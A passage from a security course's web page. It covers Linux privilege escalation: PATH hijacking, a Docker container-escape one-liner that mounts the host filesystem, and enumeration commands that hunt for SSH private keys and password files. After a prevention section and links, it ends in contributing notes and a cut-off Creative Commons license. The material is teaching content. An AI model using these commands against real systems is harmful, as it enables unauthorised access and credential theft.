</span></span></code></pre></div><pre tabindex=0><code></code></pre></li><li><a href=https://gtfobins.github.io/>GTFOBins</a> are a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</li></ul></li><li><strong>Path Hijacking</strong><ul><li>Path Hijacking occurs when a program uses the relative path to another program instead of the absolute path. Consider the following Python code:<div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#204a87;font-weight:700>import</span> <span style=color:#000>os</span>
</span></span><span style=display:flex><span><span style=color:#000>os</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>system</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;create_backup&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span></code></pre></div><pre tabindex=0><code>e `$PATH` variable is a Linux environment variable that specifies where to look for a specific binary when a full path is not provided. An attacker can exploit this mechanism by either being allowed to modify the `$PATH` variable or being able to write files inside directories specified there.
, in order to exploit the above Python code, the attacker places a program called `create_backup` inside a location from the `$PATH` variable and Linux will execute the malicious program instead of the intended one.
</code></pre></li></ul></li><li><strong>Docker Privilege Escalation / Container Escape</strong><ul><li>This requires the user to be privileged enough to run docker, i.e. being in the <code>docker</code> group or being <code>root</code>.<div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&gt; docker run -v /:/mnt --rm -it alpine chroot /mnt sh
</span></span></code></pre></div><pre tabindex=0><code>e command above creates a new container based on the `Linux Alpine` image, mounts the `/` directory from the host on `/mnt` inside the container and runs it with `/bin/sh`. Now the attacker can read any file on the system.
</code></pre></li><li>Escaping Docker privileged containers. Docker privileged containers are those run with the <code>--privileged</code> flag. Unlike regular containers, these have root privilege to the host machine. A detailed article can be read <a href=https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1>here</a></li></ul></li><li><strong>Others</strong><ul><li><code>id</code> / <code>whoami</code> - identify if the user is part of special groups, such as <code>docker</code>, <code>admin</code>, etc.</li><li><code>cat /etc/passwd</code> - list system users for potential privilege escalation</li><li><code>crontab -l</code> / <code>ls -al /etc/cron* /etc/at*</code> - enumerate cron jobs (scheduled jobs) on the system.</li><li><code>ps aux</code> / <code>ps -ef</code> - inspect running processes</li><li><code>find / -name authorized_keys 2> /dev/null</code> - find SSH authorized keys</li><li><code>find / -name id_rsa 2> /dev/null</code> - find SSH private keys</li><li><code>find / -type f -iname ".*" -ls 2>/dev/null</code> - find hidden files</li><li><code>grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null</code> - find files containing passwords.</li><li>Manually looking through web server logs, such as access or error logs for any sensitive information. Default locations for these logs:<ul><li><code>/var/log/apache2/error.log</code></li><li><code>/var/log/apache/access.log</code></li><li><code>/var/log/apache2/access.log</code></li><li><code>/etc/httpd/logs/access_log</code></li></ul></li></ul></li></ol><h3 id=tools>Tools</h3><p>There are many tools that automated the process of enumeration and could help you save a lot of time when looking for privilege escalation vectors. The best tool for Linux is <a href=https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS>LinPEAS</a>.</p><h2 id=preventing-privilege-escalation>Preventing Privilege Escalation</h2><p>When it comes to OS-level privilege escalation vulnerabilities, it&rsquo;s vital to install security patches as soon as possible, not only for the OS, but for all third-party applications used on the system.</p><p>Application whitelisting technologies can be used to restrict which programs may run on a system, enabling organizations to reduce a machine&rsquo;s attack surface. Making sure that unneeded services are turned off and that unused hardware components and drivers are disabled is also very important.</p><h2 id=further-reading>Further reading</h2><ul><li><a href=https://www.csoonline.com/article/3564726/privilege-escalation-explained-why-these-flaws-are-so-valuable-to-hackers.html>https://www.csoonline.com/article/3564726/privilege-escalation-explained-why-these-flaws-are-so-valuable-to-hackers.html</a></li><li><a href=https://portswigger.net/web-security/access-control>https://portswigger.net/web-security/access-control</a></li><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</a></li><li><a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation>https://book.hacktricks.xyz/linux-unix/privilege-escalation</a></li><li><a href=https://dirtycow.ninja/>https://dirtycow.ninja/</a></li><li><a href=https://github.com/lucyoa/kernel-exploits>https://github.com/lucyoa/kernel-exploits</a></li><li><a href=https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits>https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits</a></li><li><a href=https://gtfobins.github.io/>https://gtfobins.github.io/</a></li><li><a href=https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1>https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1</a></li><li><a href=https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS>https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></li><li><a href=https://app.hackthebox.eu/machines>https://app.hackthebox.eu/machines</a></li></ul><h2 id=challenges>Challenges</h2><ul><li>Escalation</li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-24fd7f1ab837908ca2f19a8c87b50121>10 -</h1><h1 id=contributing-to-the-web-security-track>Contributing to the Web Security Track</h1><p>We welcome contributions to the content and source code of the Web Security Track.
You may contribute by:</p><ul><li>opening <a href=https://github.com/security-summer-school/web/issues>issues</a></li><li>taking part in <a href=https://github.com/security-summer-school/web/discussions>discussions</a></li><li>creating <a href=https://github.com/security-summer-school/web//pulls>pull requests</a> to update the content</li></ul><p>Before you make any contribution, make sure it follows the <a href=https://github.com/security-summer-school/meta/blob/master/docs/contributing.md>community guide</a>.</p></div><div class=td-content style=page-break-before:always><h1 id=pg-03fe8cede4f5753ef901dba7c96bedd9>11 -</h1><h1 id=license>License</h1><p>This repository consists of actual content (Markdown files, slides) and support code (for challenges and activities and for automation and deployment).
Unless otherwise stated, actual content is licensed under the <a href=https://creativecommons.org/licenses/by-sa/4.0/>Attribution-ShareAlike 4.0 International (CC BY-SA 4.0) license</a>.
Unless otherwise stated, support code is licensed under the <a href=https://opensource.org/licenses/BSD-3-Clause>3-Clause BSD license</a> (SPDX short identifier: BSD-3-Clause).
A copy of each license is below.</p><p>Copy of CC BY-SA 4.0:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>Attribution-NonCommercial-ShareAlike 4.0 International
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>=======================================================================
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Creative Commons Corporation (&#34;Creative Commons&#34;) is not a law firm and
</span></span><span style=display:flex><span>does not provide legal services or legal advice. Distribution of
</span></span><span style=display:flex><span>Creative Commons public licenses does not create a lawyer-client or
</span></span><span style=display:flex><span>other relationship. Creative Commons makes its licenses and related
</span></span><span style=display:flex><span>information available on an &#34;as-is&#34; basis. Creative Commons gives no
</span></span><span style=display:flex><span>warranties regarding its licenses, any material licensed under their
</span></span><span style=display:flex><span>terms and conditions, or any related information. Creative Commons
</span></span><span style=display:flex><span>disclaims all liability for damages resulting from their use to the
</span></span><span style=display:flex><span>fullest extent possible.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Using Creative Commons Public Licenses
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Creative Commons public licenses provide a standard set of terms and
</span></span><span style=display:flex><span>conditions that creators and other rights holders may use to share
</span></span><span style=display:flex><span>original works of authorship and other material subject to copyright
</span></span><span style=display:flex><span>and certain other rights specified in the public license below. The
</span></span><span style=display:flex><span>following considerations are for informational purposes only, are not
</span></span><span style=display:flex><span>exhaustive, and do not form part of our licenses.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     Considerations for licensors: Our public licenses are
</span></span><span style=display:flex><span>     intended for use by those authorized to give the public
</span></span><span style=display:flex><span>     permission to use material in ways otherwise restricted by
</span></span><span style=display:flex><span>     copyright and certain other rights. Our licenses are
</span></span><span style=display:flex><span>     irrevocable. Licensors should read and understand the terms
</span></span><span style=display:flex><span>     and conditions of the license they choose before applying it.
</span></span><span style=display:flex><span>     Licensors should also secure all rights necessary before
</span></span><span style=display:flex><span>     applying our licenses so that the public can reuse the
</span></span><span style=display:flex><span>     material as expected. Licensors should clearly mark any
</span></span><span style=display:flex><span>     material not subject to the license. This includes other CC-
</span></span><span style=display:flex><span>     licensed material, or material used under an exception or
</span></span><span style=display:flex><span>     limitation to copyright. More considerations for licensors:
</span></span><span style=display:flex><span>      wiki.creativecommons.org/Considerations_for_licensors
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     Considerations for the public: By using one of our public
</span></span><span style=display:flex><span>     licenses, a licensor grants the public permission to use the
</span></span><span style=display:flex><span>     licensed material under specified terms and conditions. If
</span></span><span style=display:flex><span>     the licensor&#39;s permission is not necessary for any reason--for
</span></span><span style=display:flex><span>     example, because of any applicable exception or limitation to
</span></span><span style=display:flex><span>     copyright--then that use is not regulated by the license. Our
</span></span><span style=display:flex><span>     licenses grant only permissions under copyright and certain
</span></span><span style=display:flex><span>     other rights that a licensor has authority to grant. Use of
</span></span><span style=display:flex><span>     the licensed material may still be restricted for other
</span></span><span style=display:flex><span>     reasons, including because others have copyright or other
</span></span><span style=display:flex><span>     rights in the material. A licensor may make special requests,
</span></span><span style=display:flex><span>     such as asking that all changes be marked or described.
</span></span><span style=display:flex><span>     Although not required by our licenses, you are encouraged to
</span></span><span style=display:flex><span>     respect those requests where reasonable. More considerations
</span></span><span style=display:flex><span>     for the public:
</span></span><span style=display:flex><span>      wiki.creativecommons.org/Considerations_for_licensees
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>=======================================================================
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International
</span></span><span style=display:flex><span>Public License
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>By exercising the Licensed Rights (defined below), You accept and agree
</span></span><span style=display:flex><span>to be bound by the terms and conditions of this Creative Commons
</span></span><span style=display:flex><span>Attribution-NonCommercial-ShareAlike 4.0 International Public License
</span></span><span style=display:flex><span>(&#34;Public License&#34;). To the extent this Public License may be
</span></span><span style=display:flex><span>interpreted as a contract, You are granted the Licensed Rights in
</span></span><span style=display:flex><span>consideration of Your acceptance of these terms and conditions, and the
</span></span><span style=display:flex><span>Licensor grants You such rights in consideration of benefits the
</span></span><span style=display:flex><span>Licensor receives from making the Licensed Material available under
</span></span><span style=display:flex><span>these terms and conditions.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Section 1 -- Definitions.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>a. Adapted Material means material subject to Copyright and Similar
</span></span><span style=display:flex><span>Rights that is derived from or based upon the Licensed Material
</span></span><span style=display:flex><span>and in which the Licensed Material is translated, altered,
</span></span><span style=display:flex><span>arranged, transformed, or otherwise modified in a manner requiring
</span></span><span style=display:flex><span>permission under the Copyright and Similar Rights held by the
</span></span><span style=display:flex><span>Licensor. For purposes of this Public License, where the Licensed
</span></span><span style=display:flex><span>Material is a musical work, performance, or sound recording,
</span></span><span style=display:flex><span>Adapted Material is always produced where the Licensed Material is
</span></span><span style=display:flex><span>synched in timed relation with a moving image.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>b. Adapter&#39;s License means the license You apply to Your Copyright
</span></span><span style=display:flex><span>and Similar Rights in Your contributions to Adapted Material in
</span></span><span style=display:flex><span>accordance with the terms and conditions of this Public License.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c. BY-NC-SA Compatible License means a license listed at
</span></span><span style=display:flex><span>creativecommons.org/compatiblelicenses, approved by Creative
</span></span><span style=display:flex><span>Commons as essentially the equivalent of this Public License.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>d. Copyright and Similar Rights means copyright and/or similar rights
</span></span><span style=display:flex><span>closely related to copyright including, without limitation,
</span></span><span style=display:flex><span>performance, broadcast, sound recording, and Sui Generis Database
</span></span><span style=display:flex><span>Rights, without regard to how the rights are labeled or
</span></span><span style=display:flex><span>categorized. For purposes of this Public License, the rights
</span></span><span style=display:flex><span>specified in Section 2(b)(1)-(2) are not Copyright and Similar
</span></span><span style=display:flex><span>Rights.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>e. Effective Technological Measures means those measures that, in the
</span></span><span style=display:flex><span>absence of proper authority, may not be circumvented under laws
</span></span><span style=display:flex><span>fulfilling obligations under Article 11 of the WIPO Copyright
</span></span><span style=display:flex><span>Treaty adopted on December 20, 1996, and/or similar international
</span></span><span style=display:flex><span>agreements.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>f. Exceptions and Limitations means fair use, fair dealing, and/or
</span></span><span style=display:flex><span>any other exception or limitation to Copyright and Similar Rights
</span></span><span style=display:flex><span>that applies to Your use of the Licensed Material.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>g. License Elements means the license attributes listed in the name
</span></span><span style=display:flex><span>of a Creative Commons Public License. The License Elements of this
</span></span><span style=display:flex><span>Public License are Attribution, NonCommercial, and ShareAlike.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>h. Licensed Material means the artistic or literary work, database,
</span></span><span style=display:flex><span>or other material to which the Licensor applied this Public
</span></span><span style=display:flex><span>License.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>i. Licensed Rights means the rights granted to You subject to the
</span></span><span style=display:flex><span>terms and conditions of this Public License, which are limited to
</span></span><span style=display:flex><span>all Copyright and Similar Rights that apply to Your use of the
</span></span><span style=display:flex><span>Licensed Material and that the Licensor has authority to license.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>j. Licensor means the individual(s) or entity(ies) granting rights
</span></span><span style=display:flex><span>under this Public License.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>k. NonCommercial means not primarily intended for or directed towards
</span></span><span style=display:flex><span>commercial advantage or monetary compensation. For purposes of
</span></span><span style=display:flex><span>this Public License, the exchange of the Licensed Material for
</span></span><span style=display:flex><span>other material subject to Copyright and Similar Rights by digital
</span></span><span style=display:flex><span>file-sharing or similar means is NonCommercial provided there is
</span></span><span style=display:flex><span>no payment of monetary compensation in connection with the
</span></span><span style=display:flex><span>exchange.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>l. Share means to provide material to the public by any means or
</span></span><span style=display:flex><span>process that requires permission under the Licensed Rights, such
</span></span><span style=display:flex><span>as reproduction, public display, public performance, distribution,
</span></span><span style=display:flex><span>dissemination, communication, or importation, and to make material
</span></span><span style=display:flex><span>available to the public including in ways that members of the
</span></span><span style=display:flex><span>public may access the material from a place and at a time
</span></span><span style=display:flex><span>individually chosen by them.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>m. Sui Generis Database Rights means rights other than copyright
</span></span><span style=display:flex><span>resulting from Directive 96/9/EC of the European Parliament and of
</span></span><span style=display:flex><span>the Council of 11 March 1996 on the legal protection of databases,
</span></span><span style=display:flex><span>as amended and/or succeeded, as well as other essentially
</span></span><span style=display:flex><span>equivalent rights anywhere in the world.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>n. You means the individual or entity exercising the Licensed Rights
</span></span><span style=display:flex><span>under this Public License. Your has a corresponding meaning.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Section 2 -- Scope.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>a. License grant.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>1.</span> Subject to the terms and conditions of this Public License,
</span></span><span style=display:flex><span>          the Licensor hereby grants You a worldwide, royalty-free,
</span></span><span style=display:flex><span>          non-sublicensable, non-exclusive, irrevocable license to
</span></span><span style=display:flex><span>          exercise the Licensed Rights in the Licensed Material to:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            a. reproduce and Share the Licensed Material, in whole or
</span></span><span style=display:flex><span>               in part, for NonCommercial purposes only; and
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            b. produce, reproduce, and Share Adapted Material for
</span></span><span style=display:flex><span>               NonCommercial purposes only.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>2.</span> Exceptions and Limitations. For the avoidance of doubt, where
</span></span><span style=display:flex><span>          Exceptions and Limitations apply to Your use, this Public
</span></span><span style=display:flex><span>          License does not apply, and You do not need to comply with
</span></span><span style=display:flex><span>          its terms and conditions.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>3.</span> Term. The term of this Public License is specified in Section
</span></span><span style=display:flex><span>          6(a).
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>4.</span> Media and formats; technical modifications allowed. The
</span></span><span style=display:flex><span>          Licensor authorizes You to exercise the Licensed Rights in
</span></span><span style=display:flex><span>          all media and formats whether now known or hereafter created,
</span></span><span style=display:flex><span>          and to make technical modifications necessary to do so. The
</span></span><span style=display:flex><span>          Licensor waives and/or agrees not to assert any right or
</span></span><span style=display:flex><span>          authority to forbid You from making technical modifications
</span></span><span style=display:flex><span>          necessary to exercise the Licensed Rights, including
</span></span><span style=display:flex><span>          technical modifications necessary to circumvent Effective
</span></span><span style=display:flex><span>          Technological Measures. For purposes of this Public License,
</span></span><span style=display:flex><span>          simply making modifications authorized by this Section 2(a)
</span></span><span style=display:flex><span>          (4) never produces Adapted Material.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>5.</span> Downstream recipients.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            a. Offer from the Licensor -- Licensed Material. Every
</span></span><span style=display:flex><span>               recipient of the Licensed Material automatically
</span></span><span style=display:flex><span>               receives an offer from the Licensor to exercise the
</span></span><span style=display:flex><span>               Licensed Rights under the terms and conditions of this
</span></span><span style=display:flex><span>               Public License.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            b. Additional offer from the Licensor -- Adapted Material.
</span></span><span style=display:flex><span>               Every recipient of Adapted Material from You
</span></span><span style=display:flex><span>               automatically receives an offer from the Licensor to
</span></span><span style=display:flex><span>               exercise the Licensed Rights in the Adapted Material
</span></span><span style=display:flex><span>               under the conditions of the Adapter&#39;s License You apply.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            c. No downstream restrictions. You may not offer or impose
</span></span><span style=display:flex><span>               any additional or different terms or conditions on, or
</span></span><span style=display:flex><span>               apply any Effective Technological Measures to, the
</span></span><span style=display:flex><span>               Licensed Material if doing so restricts exercise of the
</span></span><span style=display:flex><span>               Licensed Rights by any recipient of the Licensed
</span></span><span style=display:flex><span>               Material.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>6.</span> No endorsement. Nothing in this Public License constitutes or
</span></span><span style=display:flex><span>          may be construed as permission to assert or imply that You
</span></span><span style=display:flex><span>          are, or that Your use of the Licensed Material is, connected
</span></span><span style=display:flex><span>          with, or sponsored, endorsed, or granted official status by,
</span></span><span style=display:flex><span>          the Licensor or others designated to receive attribution as
</span></span><span style=display:flex><span>          provided in Section 3(a)(1)(A)(i).
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>b. Other rights.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>1.</span> Moral rights, such as the right of integrity, are not
</span></span><span style=display:flex><span>          licensed under this Public License, nor are publicity,
</span></span><span style=display:flex><span>          privacy, and/or other similar personality rights; however, to
</span></span><span style=display:flex><span>          the extent possible, the Licensor waives and/or agrees not to
</span></span><span style=display:flex><span>          assert any such rights held by the Licensor to the limited
</span></span><span style=display:flex><span>          extent necessary to allow You to exercise the Licensed
</span></span><span style=display:flex><span>          Rights, but not otherwise.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>2.</span> Patent and trademark rights are not licensed under this
</span></span><span style=display:flex><span>          Public License.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>3.</span> To the extent possible, the Licensor waives any right to
</span></span><span style=display:flex><span>          collect royalties from You for the exercise of the Licensed
</span></span><span style=display:flex><span>          Rights, whether directly or through a collecting society
</span></span><span style=display:flex><span>          under any voluntary or waivable statutory or compulsory
</span></span><span style=display:flex><span>          licensing scheme. In all other cases the Licensor expressly
</span></span><span style=display:flex><span>          reserves any right to collect such royalties, including when
</span></span><span style=display:flex><span>          the Licensed Material is used other than for NonCommercial
</span></span><span style=display:flex><span>          purposes.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Section 3 -- License Conditions.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Your exercise of the Licensed Rights is expressly made subject to the
</span></span><span style=display:flex><span>following conditions.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>a. Attribution.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>1.</span> If You Share the Licensed Material (including in modified
</span></span><span style=display:flex><span>          form), You must:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            a. retain the following if it is supplied by the Licensor
</span></span><span style=display:flex><span>               with the Licensed Material:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                 i. identification of the creator(s) of the Licensed
</span></span><span style=display:flex><span>                    Material and any others designated to receive
</span></span><span style=display:flex><span>                    attribution, in any reasonable manner requested by
</span></span><span style=display:flex><span>                    the Licensor (including by pseudonym if
</span></span><span style=display:flex><span>                    designated);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                ii. a copyright notice;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>               iii. a notice that refers to this Public License;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                iv. a notice that refers to the disclaimer of
</span></span><span style=display:flex><span>                    warranties;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                 v. a URI or hyperlink to the Licensed Material to the
</span></span><span style=display:flex><span>                    extent reasonably practicable;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            b. indicate if You modified the Licensed Material and
</span></span><span style=display:flex><span>               retain an indication of any previous modifications; and
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            c. indicate the Licensed Material is licensed under this
</span></span><span style=display:flex><span>               Public License, and include the text of, or the URI or
</span></span><span style=display:flex><span>               hyperlink to, this Public License.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>2.</span> You may satisfy the conditions in Section 3(a)(1) in any
</span></span><span style=display:flex><span>          reasonable manner based on the medium, means, and context in
</span></span><span style=display:flex><span>          which You Share the Licensed Material. For example, it may be
</span></span><span style=display:flex><span>          reasonable to satisfy the conditions by providing a URI or
</span></span><span style=display:flex><span>          hyperlink to a resource that includes the required
</span></span><span style=display:flex><span>          information.
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>3.</span> If requested by the Licensor, You must remove any of the
</span></span><span style=display:flex><span>          information required by Section 3(a)(1)(A) to the extent
</span></span><span style=display:flex><span>          reasonably practicable.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>b. ShareAlike.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     In addition to the conditions in Section 3(a), if You Share
</span></span><span style=display:flex><span>     Adapted Material You produce, the following conditions also apply.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>1.</span> The Adapter&#39;s License You apply must be a Creative Commons
</span></span><span style=display:flex><span>          license with the same License Elements, this version or
</span></span><span style=display:flex><span>          later, or a BY-NC-SA Compatible License.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>2.</span> You must include the text of, or the URI or hyperlink to, the
</span></span><span style=display:flex><span>          Adapter&#39;s License You apply. You may satisfy this condition
</span></span><span style=display:flex><span>          in any reasonable manner based on the medium, means, and
</span></span><span style=display:flex><span>          context in which You Share Adapted Material.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>3.</span> You may not offer or impose any additional or different terms
</span></span><span style=display:flex><span>          or conditions on, or apply any Effective Technological
</span></span><span style=display:flex><span>          Measures to, Adapted Material that restrict exercise of the
</span></span><span style=display:flex><span>          rights granted under the Adapter&#39;s License You apply.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Section 4 -- Sui Generis Database Rights.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Where the Licensed Rights include Sui Generis Database Rights that
</span></span><span style=display:flex><span>apply to Your use of the Licensed Material:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>a. for the avoidance of doubt, Section 2(a)(1) grants You the right
</span></span><span style=display:flex><span>to extract, reuse, reproduce, and Share all or a substantial
</span></span><span style=display:flex><span>portion of the contents of the database for NonCommercial purposes
</span></span><span style=display:flex><span>only;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>b. if You include all or a substantial portion of the database
</span></span><span style=display:flex><span>contents in a database in which You have Sui Generis Database
</span></span><span style=display:flex><span>Rights, then the database in which You have Sui Generis Database
</span></span><span style=display:flex><span>Rights (but not its individual contents) is Adapted Material,
</span></span><span style=display:flex><span>including for purposes of Section 3(b); and
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c. You must comply with the conditions in Section 3(a) if You Share
</span></span><span style=display:flex><span>all or a substantial portion of the contents of the database.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>For the avoidance of doubt, this Section 4 supplements and does not
</span></span><span style=display:flex><span>replace Your obligations under this Public License where the Licensed
</span></span><span style=display:flex><span>Rights include other Copyright and Similar Rights.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Section 5 -- Disclaimer of Warranties and Limitation of Liability.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>a. UNLESS OTHERWISE SEPARATELY UNDERTAKEN BY THE LICENSOR, TO THE
</span></span><span style=display:flex><span>EXTENT POSSIBLE, THE LICENSOR OFFERS THE LICENSED MATERIAL AS-IS
</span></span><span style=display:flex><span>AND AS-AVAILABLE, AND MAKES NO REPRESENTATIONS OR WARRANTIES OF
</span></span><span style=display:flex><span>ANY KIND CONCERNING THE LICENSED MATERIAL, WHETHER EXPRESS,
</span></span><span style=display:flex><span>IMPLIED, STATUTORY, OR OTHER. THIS INCLUDES, WITHOUT LIMITATION,
</span></span><span style=display:flex><span>WARRANTIES OF TITLE, MERCHANTABILITY, FITNESS FOR A PARTICULAR
</span></span><span style=display:flex><span>PURPOSE, NON-INFRINGEMENT, ABSENCE OF LATENT OR OTHER DEFECTS,
</span></span><span style=display:flex><span>ACCURACY, OR THE PRESENCE OR ABSENCE OF ERRORS, WHETHER OR NOT
</span></span><span style=display:flex><span>KNOWN OR DISCOVERABLE. WHERE DISCLAIMERS OF WARRANTIES ARE NOT
</span></span><span style=display:flex><span>ALLOWED IN FULL OR IN PART, THIS DISCLAIMER MAY NOT APPLY TO YOU.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>b. TO THE EXTENT POSSIBLE, IN NO EVENT WILL THE LICENSOR BE LIABLE
</span></span><span style=display:flex><span>TO YOU ON ANY LEGAL THEORY (INCLUDING, WITHOUT LIMITATION,
</span></span><span style=display:flex><span>NEGLIGENCE) OR OTHERWISE FOR ANY DIRECT, SPECIAL, INDIRECT,
</span></span><span style=display:flex><span>INCIDENTAL, CONSEQUENTIAL, PUNITIVE, EXEMPLARY, OR OTHER LOSSES,
</span></span><span style=display:flex><span>COSTS, EXPENSES, OR DAMAGES ARISING OUT OF THIS PUBLIC LICENSE OR
</span></span><span style=display:flex><span>USE OF THE LICENSED MATERIAL, EVEN IF THE LICENSOR HAS BEEN
</span></span><span style=display:flex><span>ADVISED OF THE POSSIBILITY OF SUCH LOSSES, COSTS, EXPENSES, OR
</span></span><span style=display:flex><span>DAMAGES. WHERE A LIMITATION OF LIABILITY IS NOT ALLOWED IN FULL OR
</span></span><span style=display:flex><span>IN PART, THIS LIMITATION MAY NOT APPLY TO YOU.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c. The disclaimer of warranties and limitation of liability provided
</span></span><span style=display:flex><span>above shall be interpreted in a manner that, to the extent
</span></span><span style=display:flex><span>possible, most closely approximates an absolute disclaimer and
</span></span><span style=display:flex><span>waiver of all liability.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Section 6 -- Term and Termination.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>a. This Public License applies for the term of the Copyright and
</span></span><span style=display:flex><span>Similar Rights licensed here. However, if You fail to comply with
</span></span><span style=display:flex><span>this Public License, then Your rights under this Public License
</span></span><span style=display:flex><span>terminate automatically.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>b. Where Your right to use the Licensed Material has terminated under
</span></span><span style=display:flex><span>Section 6(a), it reinstates:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>1.</span> automatically as of the date the violation is cured, provided
</span></span><span style=display:flex><span>          it is cured within 30 days of Your discovery of the
</span></span><span style=display:flex><span>          violation; or
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       <span style=color:#204a87;font-weight:700>2.</span> upon express reinstatement by the Licensor.
